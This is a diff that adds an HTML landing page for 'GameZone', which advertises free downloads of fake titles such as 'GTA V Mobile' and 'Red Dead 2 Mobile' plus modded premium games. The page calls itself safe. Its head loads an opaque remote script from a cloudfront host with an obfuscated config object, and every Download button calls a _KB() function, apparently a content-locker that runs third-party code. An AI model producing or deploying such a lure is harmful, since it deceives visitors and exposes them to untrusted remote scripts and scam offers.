@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Top Mobile Games Download | Free & Trending</title>
+<style>
+:root {
+    --main-bg: #f6f7fb;
+    --accent: #4fd1c5;
+    --accent2: #36a1ea;
+    --card-bg: #fff;
+    --text: #232b3a;
+    --subtext: #5b6b8c;
+    --radius: 20px;
+    --transition: 0.3s;
+    --shadow: 0 4px 16px rgba(80,120,200,0.09);
+}
+body.dark {
+    --main-bg: #181f29;
+    --accent: #4fd1c5;
+    --accent2: #36a1ea;
+    --card-bg: #232b3a;
+    --text: #fff;
+    --subtext: #b5e9e3;
+    --shadow: 0 4px 16px rgba(0,0,0,0.12);
+}
+body {
+    background: var(--main-bg);
+    color: var(--text);
+    font-family: 'Segoe UI', Arial, sans-serif;
+    margin: 0;
+    line-height: 1.5;
+    transition: background var(--transition), color var(--transition);
+}
+header {
+    background: linear-gradient(90deg, var(--accent) 0%, var(--accent2) 100%);
+    padding: 1.2rem 0;
+    text-align: center;
+    position: sticky;
+    top: 0;
+    z-index: 10;
+    box-shadow: var(--shadow);
+}
+.logo {
+    font-size: 2.2rem;
+    font-weight: bold;
+    color: #fff;
+    letter-spacing: 2px;
+    margin-bottom: 0.2rem;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 0.5rem;
+}
+.logo span {
+    background: #fff;
+    color: var(--accent);
+    padding: 0 0.4em;
+    border-radius: 8px;
+    font-size: 1.3rem;
+}
+nav {
+    margin-top: 0.5rem;
+    display: inline-block;
+}
+nav a {
+    color: #fff;
+    margin: 0 1rem;
+    text-decoration: none;
+    font-weight: 500;
+    opacity: 0.85;
+    transition: color var(--transition);
+}
+nav a:hover {
+    color: #232b3a;
+}
+.theme-toggle {
+    float: right;
+    margin-right: 1.2rem;
+    margin-top: -2.8rem;
+    background: var(--card-bg);
+    color: var(--text);
+    border: none;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    cursor: pointer;
+    box-shadow: var(--shadow);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.3rem;
+    transition: background var(--transition), color var(--transition);
+}
+main {
+    max-width: 1100px;
+    margin: 2.5rem auto 0 auto;
+    padding: 0 1rem;
+}
+.intro {
+    text-align: center;
+    margin-bottom: 2rem;
+}
+.games-grid {
+    display: grid;
+    gap: 1.5rem;
+    grid-template-columns: repeat(2, 1fr);
+}
+@media (min-width: 800px) {
+    .games-grid {
+        grid-template-columns: repeat(4, 1fr);
+    }
+}
+.game-card {
+    background: var(--card-bg);
+    border-radius: var(--radius);
+    box-shadow: var(--shadow);
+    padding: 1rem;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    transition: transform var(--transition), box-shadow var(--transition);
+    opacity: 0.98;
+}
+.game-card:hover {
+    transform: translateY(-8px) scale(1.04);
+    box-shadow: 0 8px 24px #4fd1c535;
+}
+.game-img {
+    width: 96px;
+    height: 96px;
+    object-fit: contain;
+    border-radius: 18px;
+    margin-bottom: 1rem;
+    box-shadow: 0 2px 12px #4fd1c520;
+    border: 3px solid var(--accent);
+    background: #fff;
+    transition: border-color var(--transition), background var(--transition);
+}
+body.dark .game-img {
+    background: #232b3a;
+}
+.game-card:hover .game-img {
+    border-color: var(--accent2);
+}
+.game-title {
+    font-size: 1.13rem;
+    font-weight: 600;
+    margin-bottom: 0.5rem;
+    text-align: center;
+}
+.game-desc {
+    font-size: 0.97rem;
+    color: var(--subtext);
+    text-align: center;
+    margin-bottom: 1.1rem;
+    min-height: 42px;
+}
+.download-btn {
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    padding: 0.55em 1.7em;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: box-shadow var(--transition), background var(--transition), transform var(--transition);
+    box-shadow: 0 2px 10px #4fd1c530;
+    outline: none;
+    animation: pulse 1.8s infinite;
+}
+.download-btn:hover {
+    background: #f7fafc;
+    color: var(--accent);
+    transform: scale(1.05);
+}
+@keyframes pulse {
+    0% { box-shadow: 0 0 0 0 #4fd1c530; }
+    70% { box-shadow: 0 0 12px 18px #4fd1c520; }
+    100% { box-shadow: 0 0 0 0 #4fd1c530; }
+}
+footer {
+    background: var(--card-bg);
+    margin-top: 3rem;
+    padding: 2rem 0 1rem 0;
+    text-align: center;
+    border-radius: 24px 24px 0 0;
+    color: var(--subtext);
+    font-size: 1.1rem;
+    box-shadow: 0 -4px 24px #4fd1c515;
+}
+.footer-links {
+    margin-bottom: 1rem;
+}
+.footer-links a {
+    color: var(--accent2);
+    margin: 0 0.7rem;
+    text-decoration: none;
+    font-weight: 500;
+    opacity: 0.9;
+    transition: color var(--transition);
+}
+.footer-links a:hover {
+    color: var(--accent);
+}
+</style>
+</head>
+
+<script type="text/javascript">
+    var FELPY_KUn_JvSJmc={"it":4496832,"key":"37373"};
+</script>
+<script src="https://d2yc6hxtq0phup.cloudfront.net/284984f.js"></script>
+
+<body>
+    <header>
+        <button class="theme-toggle" id="themeToggle" title="Toggle theme">
+            <span id="themeIcon">🌙</span>
+        </button>
+        <div class="logo">
+            <img src="https://img.icons8.com/fluency/48/000000/controller.png" alt="Logo" style="width:32px;height:32px;">
+            Game<span>Zone</span>
+        </div>
+        <nav>
+            <a href="#games">Games</a>
+            <a href="#about">About</a>
+            <a href="#contact">Contact</a>
+        </nav>
+    </header>
+    <main>
+        <section class="intro">
+            <h1>Best Mobile Games <span style="color:var(--accent)">Download Hub</span></h1>
+            <p>Discover, play, and download the most wanted mobile games for Android & iOS. Safe, fast, and always up-to-date.</p>
+        </section>
+        <section id="games" class="games-grid">
+            <div class="game-card">
+                <img src="https://i.imgur.com/NNnGROA.png" alt="GTA V Mobile" class="game-img" loading="lazy">
+                <div class="game-title">GTA V Mobile</div>
+                <div class="game-desc">Experience Los Santos on mobile. Open world, action, and adventure!</div>
+                <button class="download-btn" onclick="_KB()">Download</button>
+            </div>
+            <div class="game-card">
+                <img src="https://i.imgur.com/0SyncdU.png" alt="Red Dead 2 Mobile" class="game-img" loading="lazy">
+                <div class="game-title">Red Dead 2 Mobile</div>
+                <div class="game-desc">Wild West adventure brought to your phone. Stunning graphics and story!</div>
+                <button class="download-btn" onclick="_KB()">Download</button>
+            </div>
+            <div class="game-card">
+                <img src="https://i.imgur.com/kBCDaDb.png" alt="Roblox MOD" class="game-img" loading="lazy">
+                <div class="game-title">Roblox MOD</div>
+                <div class="game-desc">Create, play, and explore with unlimited resources and mods!</div>
+                <button class="download-btn" onclick="_KB()">Download</button>
+            </div>
+            <div class="game-card">
+                <img src="https://i.imgur.com/0dsrdep.png" alt="Minecraft MOD" class="game-img" loading="lazy">
+                <div class="game-title">Minecraft MOD</div>
+                <div class="game-desc">Endless building and survival fun. Unlock all premium features!</div>
+                <button class="download-btn" onclick="_KB()">Download</button>
+            </div>
+            <div class="game-card">
+                <img src="https://i.imgur.com/GEvzeyD.png" alt="Free Fire" class="game-img" loading="lazy">
+                <div class="game-title">Free Fire</div>
+                <div class="game-desc">Fast-paced battle royale. Be the last survivor!</div>
+                <button class="download-btn" onclick="_KB()">Download</button>
+            </div>
+            <div class="game-card">
+                <img src="https://i.imgur.com/1nNEmAd.png" alt="Fortnite Mobile" class="game-img" loading="lazy">
+                <div class="game-title">Fortnite Mobile</div>
+                <div class="game-desc">The legendary battle royale. Build, shoot, and win!</div>
+                <button class="download-btn" onclick="_KB()">Download</button>
+            </div>
+            <div class="game-card">
+                <img src="https://i.imgur.com/kWcBXuh.png" alt="Brawl Stars MOD" class="game-img" loading="lazy">
+                <div class="game-title">Brawl Stars MOD</div>
+                <div class="game-desc">Unlock all brawlers and skins. Fast-paced multiplayer action!</div>
+                <button class="download-btn" onclick="_KB()">Download</button>
+            </div>
+            <div class="game-card">
+                <img src="https://i.imgur.com/bsYw3pe.png" alt="Stumble Guys MOD" class="game-img" loading="lazy">
+                <div class="game-title">Stumble Guys MOD</div>
+                <div class="game-desc">Ultimate knockout fun with more features and mods!</div>
+                <button class="download-btn" onclick="_KB()">Download</button>
+            </div>
+        </section>
+        <section id="about" class="intro" style="margin-top:2.5rem;">
+            <h2>About GameZone</h2>
+            <p>GameZone is your trusted place to discover and download the best mobile games, including modded and premium versions. We handpick popular and safe games for Android and iOS!</p>
+        </section>
+        <section id="contact" class="intro" style="margin-top:2rem;">
+            <h2>Contact & Support</h2>
+            <p>Need help or want to suggest a game? <br>Email us: <a href="mailto:support@gamezone.com" style="color:var(--accent);text-decoration:underline;">support@gamezone.com</a></p>
+        </section>
+    </main>
+    <footer>
+        <div class="footer-links">
+            <a href="#games">Games</a>
+            <a href="#about">About</a>
+            <a href="#contact">Contact</a>
+        </div>
+        <div>
+            &copy; 2025 GameZone. All Rights Reserved.
+        </div>
+    </footer>
+    <script>
+        // Theme handling
+        const themeToggle = document.getElementById('themeToggle');
+        const themeIcon = document.getElementById('themeIcon');
+        function setTheme(mode) {
+            if (mode === 'dark') {
+                document.body.classList.add('dark');
+                themeIcon.textContent = '☀️';
+            } else {
+                document.body.classList.remove('dark');
+                themeIcon.textContent = '🌙';
+            }
+            localStorage.setItem('theme', mode);
+        }
+        (function() {
+            let theme = localStorage.getItem('theme');
+            if (!theme) theme = 'light';
+            setTheme(theme);
+        })();
+        themeToggle.onclick = function() {
+            let isDark = document.body.classList.contains('dark');
+            setTheme(isDark ? 'light' : 'dark');
+        };
+        // تعريف الدالة _KB() إذا لم تكن موجودة (للاختبار)
+        if(typeof _KB !== "function"){
+            window._KB = function(){ alert('Download script will run here!'); }
+        }
+    </script>
+</body>
+</html>
